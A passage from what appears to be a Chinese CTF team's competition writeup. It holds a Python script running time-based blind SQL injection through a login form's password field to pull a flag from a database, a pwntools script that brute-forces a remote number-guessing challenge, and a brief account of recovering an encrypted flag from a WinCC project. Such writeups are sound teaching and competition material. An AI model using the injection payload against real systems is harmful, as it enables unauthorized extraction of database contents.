</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>str</span> <span class=o>=</span> <span class=s2>&#34;()&gt;&lt; ,@-</span><span class=si>{}</span><span class=s2>`=.*=?&#34;</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=nb>str</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>date</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;admin&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=c1># 爆列名         </span>
</span></span><span class=line><span class=cl>            <span class=c1># &#34;password&#34;: &#34;123&#39;or(if(strcmp(ord(right((select(query)from(sys.statement_analysis)limit/**/5,1),{})),</span>
</span></span><span class=line><span class=cl>            <span class=c1># {}),0,benchmark(10000000,md5(sha1(&#39;hello&#39;))))#&#34;.format(i,ord(j))             </span>
</span></span><span class=line><span class=cl>            <span class=c1># 爆flag</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;123&#39;or(if(strcmp(ord(right((select(group_concat(f1aG123))from(Fl49ish3re)limit/**/0,1),</span><span class=si>{}</span><span class=s2>)),&#34;</span>
</span></span><span class=line><span class=cl>                        <span class=s2>&#34;</span><span class=si>{}</span><span class=s2>),0,benchmark(10000000,md5(sha1(&#39;hello&#39;))))#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=nb>ord</span><span class=p>(</span><span class=n>j</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>st</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>re</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>date</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>et</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=n>et</span> <span class=o>-</span> <span class=n>st</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>t</span> <span class=o>&gt;=</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=n>j</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=misc>misc</h1><h2 id=babymisc>babymisc</h2><p>交互算法题
手动试了几次，测出来是6位数字
交互信息bank card password按照常理也是6位
也就是100000-999999
二分法手动试了几次，给的次数不够用
思路：循环交互，随机出一个比较接近999999的数字，再二分法
（就像roll角色，先随一个较高的天赋值一样）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>roll</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;&gt;&#39;</span><span class=p>,</span> <span class=s1>&#39;Y&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Please enter a number:&#39;</span><span class=p>,</span> <span class=s1>&#39;999000&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>t</span> <span class=o>!=</span> <span class=s1>&#39;low&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;ip&#39;</span><span class=p>,</span> <span class=s1>&#39;port&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>roll</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=black-sheep-wall>Black sheep wall</h2><p>使用010打开后发现是一个wincc工程项目
使用wincc打开后，发现在vbs 动作1的脚本中发现加密后的flag
<img src=/img/2022-11-06-NTFY/42.png alt>
猜测在其他场景中包含了密匙或者加密方法，于是导出该项目的所有文本
发现hint：double&amp;hex，经过搜索后发现double hex即为twice hex加密，最后解密得到flag</p><div class=blog-tags><a href=https://su-team.cn/tags/%E6%8B%9F%E6%80%81/>拟态</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/ntfy-2025-su-wu/>第八届“强网”拟态防御国际精英挑战赛 SU Writeup</a></li><li><a href=/post/ntfy-2021-su-wu/>第四届“强网”拟态防御国际精英挑战赛 SU Write-Up</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/xyb-2022-su-wu/ data-toggle=tooltip data-placement=top title="2022 祥云杯 SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/rwctf-2023-su-wu/ data-toggle=tooltip data-placement=top title="2023 RWCTF体验赛 SU Writeup">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>